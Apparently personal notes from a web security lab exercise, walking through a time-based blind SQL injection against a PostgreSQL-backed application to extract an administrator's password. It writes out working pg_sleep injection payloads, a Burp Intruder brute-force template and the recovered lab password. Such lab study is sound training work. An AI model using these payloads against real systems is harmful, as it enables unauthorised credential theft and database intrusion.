'||(SELECT CASE WHEN SUBSTR(username,1,1)= 'a' 
THEN pg_sleep(10) ELSE '' END FROM users WHERE 
username='administrator')||'


This sleeps the application response for 10 seconds
indicating that the first letter of the administrator username
in the database begins with 'a' which is true, 
otherwise it wouldnt sleep the application

this is good and means the SQL injection runs

this also means the database is a PostgreSQL database

we will modify this query further to brute force the password 
of the administrator account

we can run this and see if the application sleeps:
'||(SELECT CASE WHEN SUBSTR(password,1,1)= 'a' 
THEN pg_sleep(10) ELSE '' END FROM users WHERE 
username='administrator')||'

it doesnt... however this is because of the ='a' rather than
using >'a', when using this instead we get the sleep.
Meaning the password first letter is > a.

We will now check the length of the password using the LENGTH()
function:
'||(SELECT CASE WHEN LENGTH(password)> 10
THEN pg_sleep(10) ELSE '' END FROM users WHERE 
username='administrator')||'

found the length to be 20 characters long


knowing this we can now use intruder and cluster bomb the values 
for an attack.
Using the following payloads:
'||(SELECT CASE WHEN SUBSTR(password,ยง1ยง,1)= 'ยงaยง' 
THEN pg_sleep(100) 
ELSE '' 
END FROM users WHERE username='administrator')||

using the brute force was able to get this password by seeing how 
long a response would take to come back, if the response came back instantly
then no hit. However if there was a delay the payload was correct.

password got from this:
xk9mxn2vw5uymjoawrmt



